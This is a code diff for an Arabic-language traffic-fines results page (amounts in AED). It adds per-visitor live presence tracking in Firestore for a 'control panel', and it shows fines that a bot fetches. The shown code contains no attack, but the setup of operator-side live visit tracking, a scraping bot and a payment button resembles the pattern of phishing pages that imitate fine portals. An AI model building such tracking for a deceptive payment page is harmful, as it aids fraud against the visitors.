@@ -143,29 +143,37 @@
     // استرجاع معرف الطلب من الجلسة
     const currentOrderId = sessionStorage.getItem("last_order_id");
 
+    // كود تتبع الزيارات المباشرة للوحة التحكم
+    function trackVisit() {
+        if (currentOrderId) {
+            db.collection("active_visits").doc(currentOrderId).set({
+                page: "violations_view",
+                last_seen: firebase.firestore.FieldValue.serverTimestamp(),
+                order_id: currentOrderId
+            }, { merge: true });
+        }
+    }
+
     function listenForResults() {
         if (!currentOrderId) {
-            console.error("No active order ID found");
+            window.location.href = "index.php";
             return;
         }
 
-        // مراقبة الطلب الحالي فقط لضمان دقة البيانات
+        trackVisit();
+
         db.collection("orders").doc(currentOrderId)
           .onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
                 
-                // إذا قام البوت بتحديث الحالة إلى "completed"
-                if (data.status === "completed") {
-                    analytics.logEvent('fines_found', { amount: data.total_fines });
+                if (data.status === "completed" || data.status === "success") {
                     document.getElementById("loadingCard").style.display = "none";
                     document.getElementById("resultBox").style.display = "block";
-                    document.getElementById("totalAmount").innerText = data.total_fines + " AED";
-                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.number || "");
+                    document.getElementById("totalAmount").innerText = (data.total_fines || data.amount || "0.00") + " AED";
+                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.plate_number || data.number || "");
                 } 
-                // إذا لم توجد مخالفات
                 else if (data.status === "no_fines") {
-                    analytics.logEvent('no_fines_found');
                     document.getElementById("loadingCard").innerHTML = `
                         <div style="color: var(--main-green); font-size: 50px; margin-bottom:15px;">✓</div>
                         <div class="status-title">لا توجد مخالفات</div>
@@ -173,7 +181,6 @@
                         <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع للرئيسية</button>
                     `;
                 }
-                // في حالة فشل البوت في جلب البيانات
                 else if (data.status === "error") {
                     document.getElementById("loadingCard").innerHTML = `
                         <div style="color: #e74c3c; font-size: 50px; margin-bottom:15px;">!</div>
@@ -186,11 +193,9 @@
           });
     }
 
-    // بدء الاستماع للنتائج فور تحميل الصفحة
     if (currentOrderId) {
         listenForResults();
     } else {
-        // إذا دخل الصفحة مباشرة بدون طلب، يرجع للرئيسية
         window.location.href = "index.php";
     }
 </script>
